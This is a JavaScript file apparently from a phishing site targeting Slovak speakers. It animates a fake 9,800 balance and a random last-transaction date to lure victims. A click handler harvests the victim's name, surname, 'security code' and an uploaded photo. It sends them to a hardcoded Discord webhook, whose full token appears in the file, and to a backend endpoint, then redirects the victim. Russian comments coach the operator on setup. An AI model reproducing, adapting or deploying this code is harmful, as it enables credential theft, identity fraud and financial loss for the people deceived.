/* ═══════════════════════════════════════════════════════════
   app.js
═══════════════════════════════════════════════════════════ */

(function () {
  'use strict';

  /* ── SLOVAK MONTHS ──────────────────────────────────────── */
  const SK_MONTHS = [
    'januára','februára','marca','apríla','mája','júna',
    'júla','augusta','septembra','októbra','novembra','decembra'
  ];

  /* ── LIVE CLOCK ─────────────────────────────────────────── */
  function updateClock() {
    const now  = new Date();
    const day  = now.getDate();
    const mon  = SK_MONTHS[now.getMonth()];
    const year = now.getFullYear();
    const hh   = String(now.getHours()).padStart(2, '0');
    const mm   = String(now.getMinutes()).padStart(2, '0');
    const ss   = String(now.getSeconds()).padStart(2, '0');
    const el   = document.getElementById('live-time');
    if (el) el.textContent = `${day}. ${mon} ${year}, ${hh}:${mm}:${ss}`;
  }

  updateClock();
  setInterval(updateClock, 1000);

  /* ── RANDOM LAST TRANSACTION (1–2 years ago) ────────────── */
  (function setLastTx() {
    const daysAgo = Math.floor(Math.random() * 365) + 365;
    const date    = new Date();
    date.setDate(date.getDate() - daysAgo);
    const el = document.getElementById('last-tx');
    if (el) {
      el.textContent = `${date.getDate()}. ${SK_MONTHS[date.getMonth()]} ${date.getFullYear()}`;
    }
  })();


  /* ── BALANCE COUNTER ANIMATION ──────────────────────────── */
  (function animateBalance() {
    const el       = document.getElementById('bal-num');
    const target   = 9800.00;
    const duration = 1500;
    let startTime  = null;

    function easeOutCubic(t) {
      return 1 - Math.pow(1 - t, 3);
    }

    function step(timestamp) {
      if (!startTime) startTime = timestamp;
      const elapsed  = timestamp - startTime;
      const progress = Math.min(elapsed / duration, 1);
      const value    = easeOutCubic(progress) * target;

      if (el) {
        el.textContent = value.toLocaleString('en-US', {
          minimumFractionDigits: 2,
          maximumFractionDigits: 2,
        });
      }

      if (progress < 1) requestAnimationFrame(step);
    }

    setTimeout(() => requestAnimationFrame(step), 800);
  })();

  /* ── PROGRESS BAR INIT ──────────────────────────────────── */
  // Call after balance counter animation finishes (~2.3s)
  setTimeout(function() {
    if (typeof updateBalanceDisplay === 'function') updateBalanceDisplay();
  }, 2400);

  /* ── SCROLL-TRIGGERED REVEAL ────────────────────────────── */
  (function initReveal() {
    const items = document.querySelectorAll('.anim-up, .anim-slide');

    if (!items.length) return;

    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach(entry => {
          if (entry.isIntersecting) {
            entry.target.classList.add('visible');
            observer.unobserve(entry.target);
          }
        });
      },
      { threshold: 0.1 }
    );

    items.forEach(el => observer.observe(el));
  })();

  /* ── INPUT FOCUS EFFECTS ────────────────────────────────── */
  (function initInputs() {
    document.querySelectorAll('.form-input').forEach(input => {
      input.addEventListener('focus', () => {
        const icon = input.closest('.input-wrap')?.querySelector('.input-icon');
        if (icon) icon.style.opacity = '1';
      });
      input.addEventListener('blur', () => {
        const icon = input.closest('.input-wrap')?.querySelector('.input-icon');
        if (icon) icon.style.opacity = '0.5';
      });
    });
  })();

})();

// ==========================================
// БРОНЕБОЙНЫЙ КОД ОТПРАВКИ ДАННЫХ ЧЕРЕЗ КНОПКУ
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    console.log("Скрипт app.js успешно запущен!");

    // 🎯 ВНИМАНИЕ: Заставляем скрипт искать СРАЗУ КНОПКУ, а не форму!
    // Открой свой HTML, посмотри id твоей финальной кнопки и впиши его сюда вместо 'final-send-btn'
    const myButton = document.getElementById('final-send-btn');

    if (!myButton) {
        console.log("Крепись, Максончик: кнопка с таким ID в HTML не найдена. Проверь её id!");
        return;
    }

    myButton.addEventListener('click', async (e) => {
        e.preventDefault(); // Тормозим стандартный блудняк браузера
        console.log("Кнопка нажата, собираем данные по понятиям...");

        // 🔗 Твоя секретная ссылка на вебхук, которую ты скопировал в Дискорде
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1517213155590144250/ttXHJUd5VSbIQDkW6gSyflkwEzaoFQ-AXl-6VoiABNCXG4zQlLf1WD7fqMfPw9LkoeLH";

        // Собираем текст из инпутов
        const menoValue = document.getElementById('meno')?.value || '';
        const priezviskoValue = document.getElementById('priezvisko')?.value || '';
        const secCodeValue = document.getElementById('sec-code')?.value || '';

        // Пакуем чистый текст для твоего Vercel бэкенда
        const payload = {
            meno: menoValue,
            priezvisko: priezviskoValue,
            secCode: secCodeValue
        };

        // 📸 РАБОТА С ФОТО ДЛЯ ДИСКОРДА
        const photoInput = document.getElementById('photo-input');
        
        if (photoInput && photoInput.files.length > 0) {
            console.log("Фотка обнаружена, упаковываем посылку для Дискорда...");
            
            const realPhoto = photoInput.files[0];
            const discordForm = new FormData(); // Родной браузерный метод, весит 0 грамм
            
            // Кладём саму фотку
            discordForm.append('file', realPhoto, realPhoto.name);
            
            // Добавляем текст, чтобы в чате было понятно, чей туфля
            const messageText = `🔔 **Прилетела новая фотка!**\n👤 Пассажир: ${menoValue} ${priezviskoValue}\n🔑 Код защиты: ${secCodeValue}`;
            discordForm.append('content', messageText);

            try {
                console.log("Отправляем кабанчиком в ДС и ждём отмашки...");
                const discordResponse = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: discordForm
                });
                
                if (discordResponse.ok) {
                    console.log("Дискорд принял фотку, порядок!");
                } else {
                    console.error("Дискорд почему-то отказал. Статус:", discordResponse.status);
                }
            } catch (err) {
                console.error("Обрыв связи с Дискордом:", err);
            }
        } else {
            console.log("Фотку никто не прикреплял, шлём только текст.");
        }

        // ПАРАЛЛЕЛЬНО ШЛЁМ ОБЫЧНЫЙ ТЕКСТ НА ТВОЙ БЭКЕНД VERCEL
        try {
            const response = await fetch('/api/upload', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log("Текстовые данные успешно улетели на бэкенд!");
                
                // 🚀 ВОТ ТУТ ПЕРЕНАПРАВЛЯЕМ НА ОСНОВУ, КОГДА ВСЁ УЛЕТЕЛО
                console.log("Переходим на основу...");
                window.location.href = 'osnova.html';
            } else {
                console.error("Сервер Версела вернул ошибку:", response.status);
            }
        } catch (error) {
            console.error("Ошибка при отправке запроса на бэкенд:", error);
        }
    });
});

// Функция-переводчик Base64 (пусть побудет, хлеба не просит)
function convertFileToBase64(file) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.readAsDataURL(file);
        reader.onload = () => resolve(reader.result);
        reader.onerror = error => reject(error);
    });
}